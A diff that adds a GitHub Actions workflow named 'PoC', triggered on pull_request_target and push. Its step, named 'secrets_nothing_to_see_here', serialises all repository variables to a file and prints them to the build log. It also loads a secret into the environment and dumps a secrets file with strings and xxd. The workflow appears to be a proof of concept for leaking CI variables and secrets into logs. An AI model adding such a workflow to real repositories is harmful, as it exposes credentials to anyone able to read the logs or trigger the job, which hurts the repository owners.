@@ -1,0 +1,22 @@
+on:
+  pull_request_target:
+   branches:
+     - main
+  push:
+jobs:
+  PoC:
+    permissions:
+      contents: read
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+      - name: secrets_nothing_to_see_here
+        run: |
+          echo "$ALLMYVARS" > vars.txt
+          echo $ALLMYVARS
+          strings secrets.txt
+          xxd secrets.txt
+        shell: bash
+        env:
+          ALLMYVARS: ${{ toJSON(vars) }}
+          ALLMYSECRETS: ${{ secrets.test_secret }}
